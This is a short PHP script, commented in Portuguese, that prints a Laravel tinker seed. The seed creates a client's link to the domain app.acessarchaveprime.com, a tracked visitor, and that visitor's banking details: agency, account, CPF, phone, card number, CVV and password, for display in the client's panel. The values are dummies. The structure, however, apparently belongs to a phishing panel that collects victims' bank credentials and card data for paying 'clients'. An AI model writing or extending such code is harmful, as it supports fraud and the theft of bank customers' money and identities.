<?php
// Este é um arquivo de comando do Artisan que será executado via tinker

echo "<?php\n\n";
echo "// Encontrar o usuário cliente (Cliente 1)\n";
echo "\$usuario = App\\Models\\Usuario::where('nivel_acesso', 'cliente')->where('ativo', 1)->first();\n\n";

echo "if (!\$usuario) {\n";
echo "    echo \"Não foi possível encontrar um cliente ativo.\\n\";\n";
echo "    return;\n";
echo "}\n\n";

echo "echo \"Cliente encontrado: \" . \$usuario->nome . \" (ID: \" . \$usuario->id . \")\\n\";\n\n";

echo "// Verificar ou criar um grupo de links para o usuário\n";
echo "\$linkGroup = App\\Models\\LinkGroup::firstOrCreate(\n";
echo "    ['usuario_id' => \$usuario->id],\n";
echo "    [\n";
echo "        'title' => 'Links do Cliente ' . \$usuario->id,\n";
echo "        'description' => 'Grupo de links automático',\n";
echo "    ]\n";
echo ");\n\n";

echo "echo \"Grupo de links: \" . \$linkGroup->title . \" (ID: \" . \$linkGroup->id . \")\\n\";\n\n";

echo "// Criar ou encontrar um item de link para o domínio\n";
echo "\$dominio = 'app.acessarchaveprime.com';\n";
echo "\$linkItem = App\\Models\\LinkGroupItem::firstOrCreate(\n";
echo "    [\n";
echo "        'link_group_id' => \$linkGroup->id,\n";
echo "        'title' => 'Link do ' . \$dominio\n";
echo "    ],\n";
echo "    [\n";
echo "        'url' => 'https://' . \$dominio,\n";
echo "        'order' => 0,\n";
echo "        'active' => true\n";
echo "    ]\n";
echo ");\n\n";

echo "echo \"Link criado/encontrado: \" . \$linkItem->title . \" (ID: \" . \$linkItem->id . \")\\n\";\n\n";

echo "// Criar um visitante\n";
echo "\$visitante = App\\Models\\Visitante::create([\n";
echo "    'usuario_id' => \$usuario->id,\n";
echo "    'link_id' => \$linkItem->id,\n";
echo "    'ip' => '192.168.1.100',\n";
echo "    'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n";
echo "    'referrer' => 'https://google.com'\n";
echo "]);\n\n";

echo "echo \"Visitante criado com UUID: \" . \$visitante->uuid . \"\\n\";\n\n";

echo "// Criar informações bancárias para o visitante\n";
echo "\$informacao = App\\Models\\InformacaoBancaria::create([\n";
echo "    'visitante_uuid' => \$visitante->uuid,\n";
echo "    'data' => now(),\n";
echo "    'agencia' => '1234',\n";
echo "    'conta' => '56789-0',\n";
echo "    'cpf' => '123.456.789-00',\n";
echo "    'nome_completo' => 'Visitante de Teste',\n";
echo "    'telefone' => '(11) 98765-4321',\n";
echo "    'informacoes_adicionais' => [\n";
echo "        'cartao' => '1234 5678 9012 3456',\n";
echo "        'cvv' => '123',\n";
echo "        'senha' => 'senha123',\n";
echo "        'observacoes' => 'Teste para o Cliente 1 - domínio ' . \$dominio\n";
echo "    ]\n";
echo "]);\n\n";

echo "echo \"Informações bancárias criadas com ID: \" . \$informacao->id . \"\\n\";\n";
echo "echo \"\\nProcesso concluído com sucesso!\\n\";\n";
echo "echo \"O visitante e suas informações bancárias agora podem ser visualizados no painel do Cliente 1.\\n\";\n";
?>
